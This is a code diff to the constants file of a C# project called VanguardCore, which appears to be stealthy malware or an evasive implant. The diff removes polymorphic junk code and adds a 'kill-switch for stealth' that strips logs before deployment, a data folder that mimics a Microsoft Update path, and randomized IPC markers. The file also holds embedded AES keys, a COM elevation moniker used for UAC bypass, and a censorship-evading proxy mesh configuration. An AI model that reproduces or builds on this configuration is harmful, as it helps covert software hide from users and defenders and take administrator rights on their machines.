@@ -4,12 +4,18 @@ namespace VanguardCore
 {
     public static class Constants
     {
-        // [POLY_JUNK]
-        private static void _vanguard_d77cf33d() {
-            int val = 72351;
-            if (val > 50000) Console.WriteLine("Hash:" + 72351);
-        }
+        // [BLOCK_EDITION] Central Kill-Switch for Stealth
+        // Set to false before final deployment to remove all strings, logs, and debug markers.
+        public const bool DEBUG_MODE = true;
 
+        // Build-time randomized markers (patched by full_rebuild.ps1)
+        public const string IPC_EVENT_BASE = "Vanguard_Event_6b8d8c4a";
+        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\Vnrd";
+        
+        // Version info
+        public const string VERSION = "2.6.0-BE";
+
+        // From defense/Constants:
         // These keys are updated at build time by full_rebuild.ps1
         // AES-GCM Keys (Base64)
         public const string MASTER_KEY_B64 = "Kw0UPEgyxMAb0+92Dh886hYQHFTJw42nFyEp4IPsm0k=";
@@ -22,125 +28,15 @@ namespace VanguardCore
         public const string MONIKER_PREFIX = "Elevation:Administrator!new:";
 
         // --- ANTI-GFW PROXY MESH CONFIG ---
-        // L1: Primary VPS Proxy (Base64 XORed recommended in real build)
-        public const string L1_PROXY_HOST = ""; // e.g. "45.123.45.67"
+        public const string L1_PROXY_HOST = "";
         public const int L1_PROXY_PORT = 1080;
         public const string L1_PROXY_USER = "";
         public const string L1_PROXY_PASS = "";
 
-        // L2: Secondary Static Proxy
         public const string L2_PROXY_HOST = "";
         public const int L2_PROXY_PORT = 1080;
 
-        // Gist Mesh Discovery
         public const string GIST_MESH_FILENAME = "proxies.json";
         public static readonly string[] CLEAN_REGIONS = { "HK", "SG", "TW", "US", "DE", "FR", "JP", "GB" };
     }
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
